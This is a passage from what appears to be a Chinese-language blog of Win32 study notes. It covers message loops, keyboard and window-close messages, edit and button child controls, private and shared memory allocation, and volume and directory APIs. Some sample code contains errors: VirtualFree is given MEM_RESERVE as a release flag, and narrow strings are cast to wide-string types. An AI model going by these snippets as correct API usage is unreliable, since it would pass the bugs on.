class="comment">        int nWidth,           // window width 窗口宽度：像素</span></span><br><span class="line"><span class="comment">        int nHeight,          // window height 窗口长度：像素</span></span><br><span class="line"><span class="comment">        HWND hWndParent,      // handle to parent or owner window 父窗口句柄</span></span><br><span class="line"><span class="comment">        HMENU hMenu,          // menu handle or child identifier 菜单句柄</span></span><br><span class="line"><span class="comment">        HINSTANCE hInstance,  // handle to application instance 模块</span></span><br><span class="line"><span class="comment">        LPVOID lpParam        // window-creation data  附加数据</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    HWND hWnd = <span class="built_in">CreateWindow</span>(className, <span class="built_in">TEXT</span>(<span class="string">&quot;窗口&quot;</span>), WS_OVERLAPPEDWINDOW, <span class="number">10</span>, <span class="number">10</span>, <span class="number">600</span>, <span class="number">300</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hWnd == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果为NULL则窗口创建失败，输出错误信息</span></span><br><span class="line">        <span class="built_in">sprintf</span>(szOutBuff, <span class="string">&quot;Error: %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="built_in">OutputDebugString</span>((LPCWSTR)szOutBuff);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 显示窗口</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    ShowWindow 语法格式：</span></span><br><span class="line"><span class="comment">    BOOL ShowWindow(</span></span><br><span class="line"><span class="comment">        HWND hWnd,     // handle to window 窗口句柄</span></span><br><span class="line"><span class="comment">        int nCmdShow   // show state 显示的形式</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">ShowWindow</span>(hWnd, SW_SHOW);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 接收消息并处理</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    GetMessage 语法格式：</span></span><br><span class="line"><span class="comment">    BOOL GetMessage(</span></span><br><span class="line"><span class="comment">        LPMSG lpMsg,         // message information OUT类型参数，这是一个指针</span></span><br><span class="line"><span class="comment">        // 后三个参数都是过滤条件</span></span><br><span class="line"><span class="comment">        HWND hWnd,           // handle to window 窗口句柄，如果为NULL则表示该线程中的所有消息都要</span></span><br><span class="line"><span class="comment">        UINT wMsgFilterMin,  // first message 第一条信息</span></span><br><span class="line"><span class="comment">        UINT wMsgFilterMax   // last message 最后一条信息</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    MSG msg;</span><br><span class="line">    BOOL bRet;</span><br><span class="line">    <span class="keyword">while</span> ((bRet = <span class="built_in">GetMessage</span>(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>)) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (bRet == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// handle the error and possibly exit</span></span><br><span class="line">            <span class="built_in">sprintf</span>(szOutBuff, <span class="string">&quot;Error: %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">            <span class="built_in">OutputDebugString</span>((LPCWSTR)szOutBuff);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 转换消息</span></span><br><span class="line">            <span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line">            <span class="comment">// 分发消息：就是给系统调用窗口处理函数</span></span><br><span class="line">            <span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220404153213749.png" alt="image-20220404153213749"><figcaption aria-hidden="true">image-20220404153213749</figcaption></figure><h1 id="消息类型">消息类型</h1><p>callback的几个参数，都是之前msg的部分参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span> </span></span><br></pre></td></tr></table></figure><h2 id="处理窗口关闭">处理窗口关闭</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="处理键盘按下">处理键盘按下</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_KEYDOWN:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//MessageBox(0, 0, 0, 0)</span></span><br><span class="line">        <span class="built_in">sprintf</span>(szOutBuff, <span class="string">&quot;keyboard: %x - %x \n&quot;</span>,uMsg, wParam);</span><br><span class="line">        <span class="built_in">OutputDebugString</span>((LPCTSTR)szOutBuff);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;    </span><br><span class="line"><span class="keyword">case</span> WM_CHAR:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(szOutBuff, <span class="string">&quot;字符: %c \n&quot;</span>, wParam);</span><br><span class="line">        <span class="built_in">OutputDebugString</span>((LPCTSTR)szOutBuff);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>所有的消息直接去查就行了，</p><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220404162017477.png" alt="image-20220404162017477"><figcaption aria-hidden="true">image-20220404162017477</figcaption></figure><h1 id="子窗口">子窗口</h1><h2 id="子窗口控件">子窗口控件</h2><ol type="1"><li>Windows提供了几个预定义的窗口类以方便我们的使用，我们一般叫它们为子窗口控件，简称控件；</li><li>控件会自己处理消息，并在自己状态发生改变时通知父窗口；</li><li>预定义的控件有：按钮、复选框、编辑框、静态字符串标签和滚动条等。</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CWA_EDIT 0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CWA_BUTTON_0 0x101</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CWA_BUTTON_1 0x102</span></span><br><span class="line"><span class="comment">// gHinstance = hInstance; 全局</span></span><br><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//编辑框</span></span><br><span class="line">        <span class="built_in">CreateWindow</span>(</span><br><span class="line">            <span class="string">&quot;EDIT&quot;</span>,                                            <span class="comment">// registered class name 注册的类名，使用EDIT则为编辑框</span></span><br><span class="line">            <span class="string">&quot;&quot;</span>,                                                <span class="comment">// window name 窗口名称</span></span><br><span class="line">            WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE, <span class="comment">// window style 子窗口控件样式：子窗口、创建后可以看到、滚动条、自动换行</span></span><br><span class="line">            <span class="number">0</span>,                                                 <span class="comment">// horizontal position of window 在父窗口上的x坐标</span></span><br><span class="line">            <span class="number">0</span>,                                                 <span class="comment">// vertical position of window 在父窗口上的y坐标</span></span><br><span class="line">            <span class="number">400</span>,                                               <span class="comment">// window width 控件宽度</span></span><br><span class="line">            <span class="number">300</span>,                                               <span class="comment">// window height 控件高度</span></span><br><span class="line">            hwnd,                                              <span class="comment">// menu handle or child identifier 父窗口句柄</span></span><br><span class="line">            (HWND)CWA_EDIT,                                    <span class="comment">// menu handle or child identifier 子窗口标识</span></span><br><span class="line">            gHinstance,                                        <span class="comment">// handle to application instance 模块</span></span><br><span class="line">            <span class="literal">NULL</span>                                               <span class="comment">// window-creation data 附加数据</span></span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// 创建&quot;设置&quot;按钮</span></span><br><span class="line">        <span class="built_in">CreateWindow</span>(</span><br><span class="line">            <span class="built_in">TEXT</span>(<span class="string">&quot;BUTTON&quot;</span>),        <span class="comment">// registered class name 注册的类名，使用BUTTON则为按钮</span></span><br><span class="line">            <span class="built_in">TEXT</span>(<span class="string">&quot;设置&quot;</span>),          <span class="comment">// window name 按钮名称</span></span><br><span class="line">            WS_CHILD | WS_VISIBLE, <span class="comment">// window style 子窗口控件样式：子窗口、创建后可以看到</span></span><br><span class="line">            <span class="number">450</span>,                   <span class="comment">// horizontal position of window 在父窗口上的x坐标</span></span><br><span class="line">            <span class="number">150</span>,                   <span class="comment">// vertical position of window 在父窗口上的y坐标</span></span><br><span class="line">            <span class="number">80</span>,                    <span class="comment">// window width 控件宽度</span></span><br><span class="line">            <span class="number">20</span>,                    <span class="comment">// window height 控件高度</span></span><br><span class="line">            hwnd,                  <span class="comment">// menu handle or child identifier 父窗口句柄</span></span><br><span class="line">            (HWND)CWA_BUTTON_0,    <span class="comment">// menu handle or child identifier 子窗口标识</span></span><br><span class="line">            gHinstance,            <span class="comment">// handle to application instance 模块</span></span><br><span class="line">            <span class="literal">NULL</span>                   <span class="comment">// window-creation data 附加数据</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建&quot;获取&quot;按钮</span></span><br><span class="line">        <span class="built_in">CreateWindow</span>(</span><br><span class="line">            <span class="built_in">TEXT</span>(<span class="string">&quot;BUTTON&quot;</span>),        <span class="comment">// registered class name 注册的类名，使用BUTTON则为按钮</span></span><br><span class="line">            <span class="built_in">TEXT</span>(<span class="string">&quot;获取&quot;</span>),          <span class="comment">// window name 按钮名称</span></span><br><span class="line">            WS_CHILD | WS_VISIBLE, <span class="comment">// window style 子窗口控件样式：子窗口、创建后可以看到</span></span><br><span class="line">            <span class="number">450</span>,                   <span class="comment">// horizontal position of window 在父窗口上的x坐标</span></span><br><span class="line">            <span class="number">100</span>,                   <span class="comment">// vertical position of window 在父窗口上的y坐标</span></span><br><span class="line">            <span class="number">80</span>,                    <span class="comment">// window width 控件宽度</span></span><br><span class="line">            <span class="number">20</span>,                    <span class="comment">// window height 控件高度</span></span><br><span class="line">            hwnd,                  <span class="comment">// menu handle or child identifier 父窗口句柄</span></span><br><span class="line">            (HWND)CWA_BUTTON_1,    <span class="comment">// menu handle or child identifier 子窗口标识</span></span><br><span class="line">            gHinstance,            <span class="comment">// handle to application instance 模块</span></span><br><span class="line">            <span class="literal">NULL</span>                   <span class="comment">// window-creation data 附加数据</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 当按钮点击则处理</span></span><br><span class="line">    <span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 宏WM_COMMAND中，wParam参数的低16位中有标识，根据标识我们才能判断哪个按钮和编辑框，使用LOWORD()可以获取低16位</span></span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span> (<span class="built_in">LOWORD</span>(wParam))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 当按钮为设置</span></span><br><span class="line">        <span class="keyword">case</span> CWA_BUTTON_0:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// SetDlgItemText函数修改编辑框内容</span></span><br><span class="line">            <span class="built_in">SetDlgItemText</span>(hwnd, (<span class="keyword">int</span>)CWA_EDIT, <span class="built_in">TEXT</span>(<span class="string">&quot;HACK THE WORLD&quot;</span>));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 当按钮为获取</span></span><br><span class="line">        <span class="keyword">case</span> CWA_BUTTON_1:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// MessageBox弹框输出编辑框内容</span></span><br><span class="line">            TCHAR szEditBuffer[<span class="number">0x80</span>];</span><br><span class="line">            <span class="built_in">GetDlgItemText</span>(hwnd, (<span class="keyword">int</span>)CWA_EDIT, szEditBuffer, <span class="number">0x80</span>);</span><br><span class="line">            <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, szEditBuffer, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="虚拟内存与物理内存">虚拟内存与物理内存</h1><h2 id="可使用的物理内存">可使用的物理内存</h2><p>MmNumberOfPhysicalPages*4 = 物理内存</p><p>虚拟内存（硬盘）</p><h2 id="可识别的物理内存">可识别的物理内存</h2><p><strong>32位操作系统最多可以识别物理内存为64G</strong>，但是操作系统会进行限制，<strong>例如XP这个系统只能识别4G的物理内存</strong>（Windows Server 2003服务器版本可以识别4G以上）。</p><p>但是我们可以通过HOOK系统函数来突破XP操作系统的4GB限制</p><h1 id="私有内存的申请释放">私有内存的申请释放</h1><p>物理内存分为两类，一个是私有内存（Private）一个是共享内存（Mapped），私有内存的意思是这块物理内存（物理页）只有你使用，而共享内存则是多个进程一起用。</p><p>申请内存的方式：</p><ol type="1"><li>通过virtualAllocate/virtualAllocEx申请的：私有</li><li>通过CreateFileMapping映射的：共享</li></ol><h2 id="virtualalloc">VirtualAlloc</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">VirtualAlloc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPVOID lpAddress,        <span class="comment">// region to reserve or commit 要分配的内存区域的地址，没有特殊需求通常不指定</span></span></span></span><br><span class="line"><span class="params"><span class="function">  SIZE_T dwSize,           <span class="comment">// size of region 分配的大小，一个物理页大小是0x1000（4KB），看你需要申请多少个物理页就乘以多少</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD flAllocationType,  <span class="comment">// type of allocation 分配的类型，常用的是MEM_COMMIT（占用线性地址，也需要物理内存）和MEM_RESERVE（占用线性地址，但不需要物理内存）</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD flProtect          <span class="comment">// type of access protection 该内存的初始保护属性</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>占用线性地址并分配物理内存，可读可写：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">0x1000</span>, MEM_COMMIT, PAGE_READWRITE);<span class="comment">// 虚拟地址仍然保留，物理页不保留</span></span><br></pre></td></tr></table></figure><p>想要释放物理内存，释放线性地址就写如下代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">VirtualFree</span>(p, <span class="number">0</span>, MEM_RESERVE);<span class="comment">// 虚拟地址不保留</span></span><br></pre></td></tr></table></figure><h1 id="共享内存的申请释放">共享内存的申请释放</h1><h2 id="createfilemapping">CreateFileMapping</h2><p>内核对象，这个对象可以为我们准备物理内存，还可以将文件映射到物理页</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateFileMapping</span><span class="params">( </span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hFile,                       <span class="comment">// handle to file 文件句柄，如果不想将文件映射到物理页，则不指定该参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpAttributes, <span class="comment">// security 安全属性，包含安全描述符</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD flProtect,                    <span class="comment">// protection 保护模式，物理页的属性</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwMaximumSizeHigh,            <span class="comment">// high-order DWORD of size 高32位，在32位计算机里通常设置为空</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwMaximumSizeLow,             <span class="comment">// low-order DWORD of size 低32位，指定物理内存的大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpName                      <span class="comment">// object name 对象名字，公用时写，自己使用则可以不指定</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>创建好物理页后，还需要通过<strong>MapViewOffile函数</strong>将物理页与线性地址进行映射：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">MapViewOfFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hFileMappingObject,   <span class="comment">// handle to file-mapping object file-mapping对象的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwDesiredAccess,       <span class="comment">// access mode 访问模式(虚拟内存的限制必须比物理地址更加严格)</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwFileOffsetHigh,      <span class="comment">// high-order DWORD of offset 高32位，在32位计算机里通常设置为空</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwFileOffsetLow,       <span class="comment">// low-order DWORD of offset 低32位，指定从哪里开始映射</span></span></span></span><br><span class="line"><span class="params"><span class="function">  SIZE_T dwNumberOfBytesToMap  <span class="comment">// number of bytes to map 共享内存的大小，一般与物理页大小一致</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>示例代码，也可以双开一个，直接读</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MapFileName <span class="meta-string">&quot;共享内存&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUF_SIZE 0x1000</span></span><br><span class="line">HANDLE g_hMapFile;</span><br><span class="line">LPTSTR g_lpBuff;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 内核对象：准备好物理页，无效句柄值-1、物理页可读写、申请一个物理页</span></span><br><span class="line">    g_hMapFile = <span class="built_in">CreateFileMapping</span>(INVALID_HANDLE_VALUE, <span class="literal">NULL</span>, PAGE_READWRITE, <span class="number">0</span>, BUF_SIZE, (LPCWSTR)MapFileName);</span><br><span class="line">    <span class="comment">// 将物理页与线性地址进行映射</span></span><br><span class="line"></span><br><span class="line">    g_lpBuff = (LPTSTR)<span class="built_in">MapViewOfFile</span>(g_hMapFile, FILE_MAP_ALL_ACCESS, <span class="number">0</span>, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向物理内存中存储</span></span><br><span class="line">    *(PDWORD)g_lpBuff = <span class="number">0x12345678</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭映射，关闭映射则表示释放了线形地址，但是物理页还存在</span></span><br><span class="line">    <span class="built_in">UnmapViewOfFile</span>(g_lpBuff);</span><br><span class="line">    <span class="comment">// 关闭句柄，这样才能释放物理页，但需要等待物理页使用完毕才会真正的释放，这里只是告诉系统我们当前进程不再使用该句柄（物理页）</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(g_hMapFile);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="文件系统未完成文件操作相关api未写">文件系统(未完成，文件操作相关API未写)</h1><p>文件系统是操作系统用于管理磁盘上文件的方法和数据结构；简单点说就是在磁盘上如何组织文件的<strong>方法</strong>。</p><p>文件系统是软件层面的。</p><table><thead><tr class="header"><th></th><th>NTFS</th><th>FAT32</th></tr></thead><tbody><tr class="odd"><td>磁盘分区容量</td><td>2T</td><td>32G</td></tr><tr class="even"><td>单个文件容量</td><td>4G以上</td><td>最大4G</td></tr><tr class="odd"><td>EFS加密</td><td>支持</td><td>不支持</td></tr><tr class="even"><td>磁盘配额</td><td>支持</td><td>不支持</td></tr></tbody></table><h2 id="卷相关api">卷相关API</h2><h3 id="获取卷逻辑驱动器">获取卷（逻辑驱动器）</h3><p>函数<strong>GetLogicalDrives</strong>用于获取当前计算机所有逻辑驱动器，语法格式为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">GetLogicalDrives</span><span class="params">(VOID)</span></span>; <span class="comment">// 返回值是一个DOWRD，没有参数</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DWORD gLd = <span class="built_in">GetLogicalDrives</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;GetLogicalDrives: %x\n&quot;</span>, gLd);</span><br></pre></td></tr></table></figure><h3 id="获取所有逻辑驱动器的字符串">获取所有逻辑驱动器的字符串</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">GetLogicalDriveStrings</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD nBufferLength,  <span class="comment">// size of buffer 输入类型，要获取字符串的大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPTSTR lpBuffer       <span class="comment">// drive strings buffer 输出类型，将获取的字符串放到该参数中</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220404184443807.png" alt="image-20220404184443807"><figcaption aria-hidden="true">image-20220404184443807</figcaption></figure><h3 id="获取卷逻辑驱动器的类型">获取卷（逻辑驱动器）的类型</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">UINT <span class="title">GetDriveType</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpRootPathName   <span class="comment">// root directory 根目录，这里我们可以使用驱动器字符串</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="获取卷信息">获取卷信息</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">GetVolumeInformation</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpRootPathName,           <span class="comment">// root directory 输入类型，驱动器字符串</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPTSTR lpVolumeNameBuffer,        <span class="comment">// volume name buffer 输出类型，返回卷名</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD nVolumeNameSize,            <span class="comment">// length of name buffer 输入类型，卷名长度</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPDWORD lpVolumeSerialNumber,     <span class="comment">// volume serial number 输出类型，卷宗序列号</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPDWORD lpMaximumComponentLength, <span class="comment">// maximum file name length 输出类型，指定文件系统支持的文件名组件的最大长度</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPDWORD lpFileSystemFlags,        <span class="comment">// file system options 输出类型，与指定文件系统相关的标志</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPTSTR lpFileSystemNameBuffer,    <span class="comment">// file system name buffer 输出类型，文件系统（如FAT或NTFS）名称</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD nFileSystemNameSize         <span class="comment">// length of file system name buffer 输入类型，文件系统名称的长度</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220404222404635.png" alt="image-20220404222404635"><figcaption aria-hidden="true">image-20220404222404635</figcaption></figure><h2 id="目录相关api">目录相关API</h2><h2 id="创建目录">创建目录</h2><p>CreateDirectory</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateDirectory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpPathName,                         <span class="comment">// directory name 目录名称，需要指定完整路径包含盘符的</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpSecurityAttributes  <span class="comment">// SD 安全属性，包含安全描述符</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateDirectory</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;E:\\A&quot;</span>), <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><h2 id="删除目录">删除目录</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">RemoveDirectory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpPathName   <span class="comment">// directory 